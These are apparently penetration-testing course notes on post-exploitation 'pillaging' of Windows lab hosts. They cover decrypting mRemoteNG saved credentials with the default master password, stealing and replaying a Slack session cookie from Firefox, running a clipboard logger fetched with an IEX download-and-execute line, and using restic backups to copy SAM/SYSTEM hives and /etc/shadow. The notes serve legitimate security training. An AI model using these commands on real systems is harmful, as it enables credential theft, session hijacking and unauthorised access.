# Pillaging

> [!info] Definition
> Pillaging is the process of extracting information from a compromised system — personal data, corporate blueprints, credit card data, infrastructure details, passwords, or anything else relevant to the assessment. It helps gain further network access or complete the goals set during pre-engagement.

## Data Sources to Check

- Installed applications / installed services
- Websites, file shares, databases
- Directory services (AD, Azure AD, etc.)
- Name servers, deployment services, Certificate Authority
- Source code management servers, virtualization platforms
- Messaging, monitoring & logging systems, backups
- Keylogging, screen capture, network traffic capture
- Previous audit reports, user info, history files, interesting documents (`.doc/x`, `.xls/x`, `password.`, `pass.`, etc.)
- Roles/privileges, web browsers, IM clients

> [!tip] Not exhaustive
> Anything providing information about the target has value — familiarity with common applications and where they store data (config files, registry, local DBs) is the key skill here.

## mRemoteNG Credential Extraction

mRemoteNG stores connections + credentials in `confCons.xml`, encrypted using a **hardcoded default master password: `mR3m`** if the user never set a custom one.

Default location: `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`

```powershell
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG

    Directory: C:\Users\julio\AppData\Roaming\mRemoteNG

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/21/2022   8:51 AM                Themes
-a----        7/21/2022   8:51 AM            340 confCons.xml
              7/21/2022   8:51 AM            970 mRemoteNG.log
```

Example config with default master password:

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```

`Protected` (root attribute) = encryption check value for the master password. Each `Node`'s `Password` attribute is the per-connection encrypted secret.

## Abusing Cookies for IM Client Access (Slack Example)

If credentials/MFA can't be obtained directly, stealing the session **cookie** lets you authenticate as the user in a browser. For Slack, the cookie named `d` holds the auth token (see [SlackExtract](https://github.com/CroweCybersecurity/slack-extract), [Abusing Slack for Offensive Operations](https://slack.com/), [Phishing for Slack tokens](https://slack.com/)).

### Firefox

Cookies live in an SQLite DB per profile:

```powershell
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

Extract the `d` cookie for Slack with `cookieextractor.py`:

```shellsession
s0nam@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
```

Load the extracted `d` value into the browser using the  [Cookie-Editor](https://cookie-editor.cgagnier.ca/).extension on `slack.com`, save, and refresh — you're now logged in as the user. Repeat the swap on any subsequent auth prompt (e.g. clicking **Launch Slack**).

> [!tip] Post-access search
> Use Slack's built-in search for terms like `creds`, `password`, `PII` once authenticated as the user.

## Clipboard Monitoring

Password managers often mean users copy/paste credentials instead of typing them — keylogging misses this, but clipboard monitoring catches it. **Invoke-Clipboard**:

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
PS C:\htb> Invoke-ClipboardLogger
```

Example captured output:

```powershell
PS C:\htb> Invoke-ClipboardLogger

https://portal.azure.com

Administrator@something.com

Sup9rC0mpl2xPa$$ws0921lk
```

> [!info] Other options
> Mimikatz or a dedicated keylogger can also grab credentials; C2 frameworks like Metasploit include built-in keylogging functions.

## Roles and Services — Attacking Backup Servers

Typical server roles worth profiling: file/print servers, web/DB servers, Certificate Authority servers, source code management servers, backup servers.

Backup systems usually run with a **local admin account** to reach all files/services on the target — compromising the backup system can expose the whole environment.

### Restic Backup Example
`Restic` is a modern backup program that can back up files in Linux, BSD, Mac, and Windows.
 [restic](https://restic.net/) runs on Linux, BSD, Mac, **and** Windows — the workflow is the same everywhere, only the interesting target paths differ:

| Aspect                       | Linux backup target                                  | Windows backup target                           |
| ---------------------------- | ---------------------------------------------------- | ----------------------------------------------- |
| Credential store to look for | `/etc/shadow`, `.ssh/` directories, web config files | SAM & SYSTEM registry hives                     |
| Typical restic binary        | `restic` in `$PATH`                                  | `C:\Windows\System32\restic.exe` (this lab)     |
| Password source              | `RESTIC_PASSWORD` env var, else prompted             | Same — `RESTIC_PASSWORD` env var, else prompted |
the latest version of restic, visit [https://github.com/restic/restic/releases/latest](https://github.com/restic/restic/releases/latest).
Initialize a repository (creates and asks for a password):

```powershell
PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init

    Directory: E:\
```

Back up a directory:

```powershell
PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder

created new cache in C:\Users\jeff\AppData\Local\restic

Added to the repo: 927 B

processed 1 files, 22 B in 0:00

```

For directories with files actively in use by the OS (e.g. `C:\Windows\System32\config`), use `--use-fs-snapshot` to trigger a VSS snapshot:

```powershell
PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

repository fdb2e6dd opened successfully, password is correct
no parent snapshot found, will read all files

```

> [!warning] Access denied ≠ failure
> If the current user lacks rights to read a directory's contents, the snapshot is still created — just empty. Check permissions and re-run as a more privileged user if needed.

List existing snapshots:

```powershell
PS C:\htb> restic.exe -r E:\restic2\ snapshots
```

Restore a snapshot by ID:

```powershell
PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore

repository fdb2e6dd opened successfully, password is correct
restoring <Snapshot 9971e881 of [C:\SampleFolder] at 2022-08-09 14:18:59.4715994 -0700 PDT by PILLAGING-WIN01\jeff@PILLAGING-WIN01> to C:\Restore
```

Restored files land under the original drive-letter path structure, e.g. `C:\Restore\C\SampleFolder`.

> [!tip] Windows backup target
> If backing up a Windows host, prioritize the **SAM & SYSTEM hives** for local hash extraction, plus web app directories and config files (`web.config`, etc.) for stored credentials.

> [!info] Finding snapshots blind
> restic works similarly in Linux. If we don't know where restic snapshots are saved, we can look in the file system for a directory named snapshots. Keep in mind that the environment variable may not be set. If that's the case, we will need to provide a password to restore the files.
